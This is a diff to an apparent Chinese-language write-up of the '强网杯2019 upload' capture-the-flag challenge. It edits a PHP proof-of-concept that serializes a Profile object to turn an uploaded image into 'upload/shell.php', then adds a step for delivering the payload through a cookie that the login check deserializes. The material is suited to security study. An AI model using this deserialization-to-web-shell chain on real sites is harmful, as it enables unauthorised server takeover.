@@ -624,7 +624,7 @@ class Register {
 class Profile{
 	public $checker = 1; 
     public $filename_tmp = './upload/d80b11f5e8fe401a099747c3100a007/4a47a0db6e60853dedfcfdf08a5ca249.png'; //查看图片链接，改地址
-    public $filename = 'shell.php';
+    public $filename = 'upload/shell.php';
     public $upload_menu;
     public $ext = 1;
     public $img;
@@ -634,6 +634,8 @@ class Profile{
 $a = new Register();
 echo base64_encode(serialize($a)); //注意赛题源码反序列化时用
 ```
+
+随便一个界面，更改cookie。刷新。因为哪个界面刷新都会进入判断是否登录的方法。而该方法里就有反序列化。
 
 ![image-20210810013955757](%5B%E5%BC%BA%E7%BD%91%E6%9D%AF2019%5Dupload.assets/image-20210810013955757.png)
 
